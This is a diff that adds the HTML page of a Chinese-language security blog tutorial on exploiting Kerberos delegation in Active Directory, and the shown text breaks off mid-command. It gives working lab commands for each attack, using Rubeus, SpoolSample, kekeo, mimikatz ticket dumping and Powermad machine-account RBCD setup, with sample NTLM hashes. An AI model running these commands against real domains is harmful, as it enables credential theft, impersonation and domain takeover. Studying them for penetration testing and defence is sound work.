@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.88.1" /><meta name="theme-color" content="#16171d" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>域委派利用 | MYZXCG</title>
+
+    <link rel="stylesheet" href="/css/meme.min.ee7d92038178eda958210f69458541e2686ada11055b93762d6d324f2acc47c5.css"/>
+
+    
+    
+        <script src="/js/meme.min.4194bf2034241e3757fbbbf5fe4db43d0ff17c81f4496e6bc931504f0978cbd2.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
+
+    <meta name="author" content="myzxcg" /><meta name="description" content="前言 前面文章Kerberos认证与委派总结了非约束委派、约束委派、基于资源的约束委派……" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="MYZXCG" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="MYZXCG" />
+    <meta name="msapplication-starturl" content="../../../" />
+    <meta name="msapplication-TileColor" content="#603cba" />
+    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+
+    
+    
+
+    
+    <link rel="canonical" href="https://myzxcg.com/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2021-10-19T00:05:45+08:00",
+        "dateModified": "2021-11-20T14:49:36+08:00",
+        "url": "https://myzxcg.com/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/",
+        "headline": "域委派利用",
+        "description": "前言 前面文章Kerberos认证与委派总结了非约束委派、约束委派、基于资源的约束委派……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  4081 ,
+        "image": "https://myzxcg.com/icons/favicon.ico",
+        "author": {
+            "@type": "Person",
+            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
+            "email": "myzx.xcg@gmail.com",
+            "image": "https://myzxcg.com/avatar.png",
+            "url": "https://myzxcg.com/",
+            "name": "myzxcg"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "MYZXCG",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://myzxcg.com/icons/favicon.ico"
+            },
+            "url": "https://myzxcg.com/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://myzxcg.com/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:site" content="@myzxcg" />
+<meta name="twitter:creator" content="@myzxcg" />
+
+    
+
+
+
+<meta property="og:title" content="域委派利用" />
+<meta property="og:description" content="前言 前面文章Kerberos认证与委派总结了非约束委派、约束委派、基于资源的约束委派……" />
+<meta property="og:url" content="https://myzxcg.com/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/" />
+<meta property="og:site_name" content="MYZXCG" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/icons/favicon.ico" />
+    <meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2021-10-19T00:05:45&#43;08:00" />
+    <meta property="article:modified_time" content="2021-11-20T14:49:36&#43;08:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+        <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />
+
+        
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0LZRMN44V"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-Y0LZRMN44V');
+    </script>
+
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">MYZXCG</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/archives/"><span class="menu-item-name">文章</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                
+            
+        
+            
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">域委派利用</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2021-10-19T00:05:45&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.10.19</time>
+    
+    
+    
+    
+        
+        
+        
+            
+        
+    
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;9&nbsp;分钟</span>
+    
+
+   
+    
+
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:前言" href="#前言">前言</a></li>
+    <li><a id="contents:非约束委派" href="#非约束委派">非约束委派</a></li>
+    <li><a id="contents:约束委派" href="#约束委派">约束委派</a>
+      <ol>
+        <li><a id="contents:kekohttpsgithubcomgentilkiwikekeo" href="#kekohttpsgithubcomgentilkiwikekeo"><a href="https://github.com/gentilkiwi/kekeo">keko</a></a></li>
+        <li><a id="contents:rubeus" href="#rubeus">rubeus</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:基于资源的约束委派" href="#基于资源的约束委派">基于资源的约束委派</a>
+      <ol>
+        <li><a id="contents:利用过程" href="#利用过程">利用过程</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:防御与检测" href="#防御与检测">防御与检测</a></li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+                <h2 id="前言"><a href="#前言" class="anchor-link">#</a><a href="#contents:前言" class="headings">前言</a></h2>
+<p>前面文章<a href="https://myzxcg.com/2021/08/Kerberos%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%A7%94%E6%B4%BE/" target="_blank" rel="noopener">Kerberos认证与委派</a>总结了非约束委派、约束委派、基于资源的约束委派的概念和通信过程。下面说说这三种委派的利用方法。</p>
+<h2 id="非约束委派"><a href="#非约束委派" class="anchor-link">#</a><a href="#contents:非约束委派" class="headings">非约束委派</a></h2>
+<p>Microsoft在Windows 2000中实现了Kerberos不受约束的委托。<strong>域控主机账户默认开启非约束委派</strong>。</p>
+<p>如果服务(<code>JACKSON-PC$</code>) 被配置了非约束的委派，那么<code>JACKSON-PC$</code>可以接受任何用户的委派的去请求其他所有服务。配置了非约束委派的账户的userAccountControl属性有<code>TRUSTED_FOR_DELEGATION</code>FLAG位（对应十进制524288）。</p>
+<p><strong>利用步骤</strong></p>
+<ul>
+<li>寻找配置了非约束的委派的账户并获得该账户权限。</li>
+<li>诱导域管或其他账户访问配置了非约束委派的服务（域管账户会将自己TGT发送到<code>JACKSON-PC$</code>并缓存到<code>JACKSON-PC$</code>的LSASS中，然后就可以从LSASS中导出域管的TGT票据）</li>
+<li>导出票据进行PTT。</li>
+</ul>
+<p><strong>非约束性委派配合 Spooler打印机服务</strong></p>
+<p>纯非约束性委派攻击必须要其他用户主动访问配置了非约束委派的服务。但利用Windows打印系统远程协议<code>MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex)</code>强制任何运行了Spooler服务的计算机对指定的主机发起Kerberos或NTLM认证请求。</p>
+<p><a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">SpoolSample</a></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#WIN7使用Rubeus开启监听来自其他主机的TGT</span>
+<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">interval</span><span class="err">:</span><span class="n">1</span> <span class="p">/</span><span class="n">filteruser</span><span class="err">:</span><span class="n">xx</span>
+<span class="c">#SpoolSample让指定机器访问WIN7进行身份验证</span>
+<span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="n">dc</span> <span class="n">win7</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="约束委派"><a href="#约束委派" class="anchor-link">#</a><a href="#contents:约束委派" class="headings">约束委派</a></h2>
+<p>微软在Windows 2003上发布了约束委派。 其中包括一组Kerberos协议扩展（S4U2Self和S4U2Proxy）。需要SeEnableDelegation特权才能配置约束和非约束委派。</p>
+<p>计算机用户(<code>JACKSON-PC$</code>) 被配置了约束委派，那么<code>JACKSON-PC$</code>可以接受任何用户的委派的去请求特定的服务。配置了约束委派用户的userAccountControl 属性有<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>FLAG位（对应十进制16777216）以及<code>msDS-AllowedToDelegateTo</code>属性存储对哪个SPN进行委派。</p>
+<p><strong>完整请求流程</strong></p>
+<ol>
+<li>服务1使用自己的hash向KDC申请一个TGT票据，注意在KDC Option里面选择FORWARDABLE标志位，这样的话请求的TGT票据就是可转发的TGT票据。</li>
+<li>服务1代表用户申请一个获得针对服务1自身的kerberos服务票据(S4U2SELF)，这一步生成的TGS票据是可转发的TGS票据。</li>
+<li>服务1使用来自用户的授权( 在S4U2SELF阶段获得的可转发的TGS)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的TGS，返回的TGS是可转发的。</li>
+</ol>
+<p>如果获得来配置了约束委派的服务账号权限。就可以利用这个服务账号代表任意用户访问另外一个服务。（这里服务不需要用户的凭据）相较于非约束的委派，约束的委派并不需要用户主动访问就可以代表该用户，但只能访问特定的服务。</p>
+<p>可利用的委派服务:</p>
+<blockquote>
+<p>对于 HOST SPN，则可以实现完全的远程接管。</p>
+<p>对于 MSSQLSvc SPN，则可以拿到 DBA 权限。</p>
+<p>对于 CIFS SPN 则可以实现完全的远程文件访问。</p>
+<p>对于 HTTP SPN 则可能实现接管远程网络服务。</p>
+<p>对于 LDAP 则可以执行 DCSync。</p>
+<p>对于 HTTP 或 SQL 服务帐户，即使它们没有提升目标服务器上的管理员权限，也可能使用 Rotten Potato 进一步滥用，提权至 SYSTEM 的权限。</p>
+</blockquote>
+<p><strong>Tips:</strong> 在测试约束委派的时候，必须将委派设置为使用任何身份验证协议。否则会报错： <em><code>KRB-ERROR (13) : KDC_ERR_BADOPTION</code></em></p>
+<p>解释一下为什么必须选&quot;使用任何身份验证协议&quot;：</p>
+<p>选择&quot;仅信任此用户作为指定服务的委派&quot;，即选择constrained delegation权限(S4U2Proxy)。</p>
+<p>该选项下的&quot;使用任何身份验证协议&quot;则是protocol transition权限(S4U2self)。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#查询useraccountcontrol属性，如果选择了&#34;使用任何身份验证协议&#34;,则该属性才有TRUSTED_TO_AUTH_FOR_DELEGATION字段</span>
+<span class="nb">Get-DomainObject</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="nb">msds-allowedtodelegateto</span> <span class="p">|</span><span class="nb">fl
+</span></code></pre></td></tr></table></div>
+</div>
+</div><h3 id="kekohttpsgithubcomgentilkiwikekeo"><a href="#kekohttpsgithubcomgentilkiwikekeo" class="anchor-link">#</a><a href="#contents:kekohttpsgithubcomgentilkiwikekeo" class="headings"><a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">keko</a></a></h3>
+<p>环境：<code>PC-JACK-0DAY$</code>账户配置了到owa2010sp3的cifs服务约束委派。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#请求PC-JACK-0DAY$的TGT</span>
+<span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">NTLM</span><span class="err">:</span><span class="n">35c7a1ec7ab4df8d073abe65e5375f3a</span>
+<span class="c">#获取访问目标的TGS （S4U2Self和S4U2Proxy过程的结合）</span>
+<span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="nb">TGT_PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG_krbtgt</span><span class="p">~</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span><span class="nv">@0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2010SP3</span>
+<span class="c">#PTT</span>
+<span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">TGS_administrator</span><span class="nv">@0day</span><span class="p">.</span><span class="n">org</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG_cifs</span><span class="p">~</span><span class="n">OWA2010SP3</span><span class="nv">@0DAY</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>如果不知道服务用户的明文和NTLM Hash，但是有服务用户登陆的主机权限，可以从内存中把服务用户的TGT票据 dump出来</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#导出TGT</span>
+<span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::tickets /export&#34;</span>
+<span class="c">#直接tgs::s4u，再导入到内存中</span>
+<span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="p">[</span><span class="n">0</span><span class="p">;</span><span class="n">3e7</span><span class="p">]-</span><span class="n">2</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">40e00000-PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span><span class="nv">@krbtgt</span><span class="p">-</span><span class="n">0DAY</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">Administrator</span><span class="nv">@0day</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2010SP3</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h3 id="rubeus"><a href="#rubeus" class="anchor-link">#</a><a href="#contents:rubeus" class="headings">rubeus</a></h3>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">35c7a1ec7ab4df8d073abe65e5375f3a</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2010SP3</span> <span class="p">/</span><span class="n">ptt</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="anchor-link">#</a><a href="#contents:基于资源的约束委派" class="headings">基于资源的约束委派</a></h2>
+<p>基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。</p>
+<p>基于资源的约束委派与传统约束委派非常相似但配置相反。服务1到服务2的约束委派在服务1账户的msDS-AllowedToDelegateTo属性中配置，定义从服务1到服务2的&quot;传出&quot;信任。而基于资源的约束委派是在服务2的msDS-AllowedToActOnBehalfOfOtherIdentity属性中配置，定义从服务1到服务2的&quot;传入&quot;信任。所以只要拥有服务2的权限就可以配置服务2的基于资源的约束委派。</p>
+<p><strong>完整请求流程</strong></p>
+<ol>
+<li>服务1使用自己的Hash向KDC申请一个TGT票据（可转发的）。</li>
+<li>服务1代表用户申请一个获得针对服务1自身的kerberos服务票据(S4U2SELF过程，返回的票据是不可转发的）这个过程设置Resource-Based Constrained Delegation(RBCD)标志位。</li>
+<li>服务1可以使用来自用户的授权( 在S4U2SELF阶段获得的不可转发的TGS)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的可转发的TGS。</li>
+</ol>
+<p><strong>利用步骤</strong></p>
+<ol>
+<li>拥有一个任意的服务账户1或者计算机账户1</li>
+<li>获得了服务账户2的LDAP权限（即有修改服务账户2属性的权限）</li>
+<li>配置服务1对服务2的约束委派，在服务账户2的用户属性上配置 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 为服务账户1的SID</li>
+<li>发起一个从服务1到服务2的正常的约束委派的流程访问服务2</li>
+</ol>
+<h3 id="利用过程"><a href="#利用过程" class="anchor-link">#</a><a href="#contents:利用过程" class="headings">利用过程</a></h3>
+<p><strong>利用前提：</strong> 具有修改机器用户（服务账户）的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限。</p>
+<ol>
+<li>当计算机<code>PC-JACK-0DAY</code>通过域用户jack@0day.org加入域时，域内会创建<code>PC-JACK-0DAY</code>的机器账户，而创建者就是jack@0day.org，所以该域用户具有对<code>PC-JACK-0DAY</code>对象的WriteProperty权限。</li>
+<li>其次就是<code>PC-JACK-0DAY</code>这个机器账户对自身有修改权限。</li>
+</ol>
+<p><strong>Tips：</strong> 如果对对象有<code>GenericAll（完全控制权）、GenericWrite、WriteProperty、WriteDacl</code>权限，那么就能够修改对象的属性。</p>
+<p><strong>环境:</strong> 拥有一个域账号jerry并对机器账户<code>PC-JACK-0DAY$</code>属性有可修改权限。</p>
+<p><strong>目的:</strong> 获取机器<code>PC-JACK-0DAY</code>的权限。</p>
+<ol>
+<li>
+<p>创建机器账号（因为S4U2Self只适用于具有SPN的账户）<a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">Powermad</a></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#利用MachineAccountQuota创建新的计算机帐户（新的计算机帐户默认注册RestrictedKrbHost/domain和 HOST/domain这两个SPN）。</span>
+<span class="c">#添加一个密码qweasd.123,用户名为matty的机器账户</span>
+<span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">matty</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;qweasd.123&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>配置matty机器账户到<code>PC-JACK-0DAY</code>的委派</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#查看jerry用户对PC-JACK-0DAY对象的权限（如果没有权限，什么都不会返回）</span>
+<span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;S-1-5-21-1812960810-2335050734-3517558805-1128&#34;</span><span class="p">}</span>
+
+<span class="c">#获取matty的SID</span>
+<span class="nb">Get-DomainComputer</span> <span class="n">-Identity</span> <span class="n">matty</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
+<span class="c">#sid是matty的</span>
+<span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1812960810-2335050734-3517558805-1181)&#34;</span>
+<span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
+<span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
+<span class="c">#添加PC-JACK-0DAY$属性msDS-AllowedToActOnBehalfOfOtherIdentity，并设置matty到PC-JACK-0DAY的委派</span>
+<span class="nb">Set-DomainObject</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
+<span class="c">#查看是否成功添加</span>
+<span class="nb">Get-DomainComputer</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Properties</span> <span class="nb">msds-allowedtoactonbehalfofotheridentity</span>
+<span class="c">#清除msds-allowedtoactonbehalfofotheridentity属性的值</span>
+<span class="nb">Set-DomainObject</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Clear</span> <span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> <span class="n">-Verbose</span>
+
+<span class="c">#方法二 使用[Microsoft.ActiveDirectory.Management.dll](&lt;https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll&gt;)</span>
+<span class="nb">Set-ADComputer</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="n">matty</span><span class="p">$</span>
+<span class="nb">Get-ADComputer</span> <span class="nb">PC-JACK</span><span class="p">-</span><span class="n">0DAY</span> <span class="n">-Properties</span> <span class="n">PrincipalsAllowedToDelegateToAccount</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>发起约束委派请求</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#获取matty$用户的hash（知道密码可以本地生成）</span>
+<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">matty</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="n">qweasd</span><span class="p">.</span><span class="n">123</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
+
+<span class="c">#请求PC-JACK-0DAY机器的cifs票据</span>
+<span class="c">#Rubeus </span>
